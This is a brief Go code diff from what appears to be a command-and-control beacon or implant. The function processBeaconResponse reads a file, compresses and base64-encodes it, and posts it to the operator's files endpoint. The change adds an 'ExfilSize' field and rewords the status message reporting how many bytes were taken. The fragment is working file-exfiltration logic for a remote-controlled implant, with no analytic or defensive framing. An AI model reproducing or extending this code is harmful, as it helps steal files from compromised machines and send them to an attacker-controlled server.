@@ -325,18 +325,19 @@ func processBeaconResponse(callback types.StzCallback, dataList []types.StzBeaco
 				finalContent := _compressedPrefix + encodedContent
 				// Confirm command execution with encoded file content
 				fileReq := types.StzFileRequest{
-					ID:       data.ID,
-					UUID:     config.UUID,
-					Fullname: filePath,
-					MD5:      files.GetMD5(compressedContent.Bytes()),
-					Size:     int64(len(fileContent)),
-					B64Data:  finalContent,
+					ID:        data.ID,
+					UUID:      config.UUID,
+					Fullname:  filePath,
+					MD5:       files.GetMD5(compressedContent.Bytes()),
+					Size:      int64(len(fileContent)),
+					ExfilSize: int64(len(finalContent)),
+					B64Data:   finalContent,
 				}
 				if err := sendHTTPFile(callback.Endpoints[callbacks.FilesEndpoint], fileReq); err != nil && !_silence {
 					log.Println(err)
 				}
 				// Confirm the command is completed
-				txtData := strconv.Itoa(len(finalContent)) + " bytes extracted"
+				txtData := fmt.Sprintf("%d bytes received (%d original size)", fileReq.ExfilSize, fileReq.Size)
 				confirm := types.StzExecutionStatus{
 					Status: types.StzStatusDone,
 					UUID:   config.UUID,
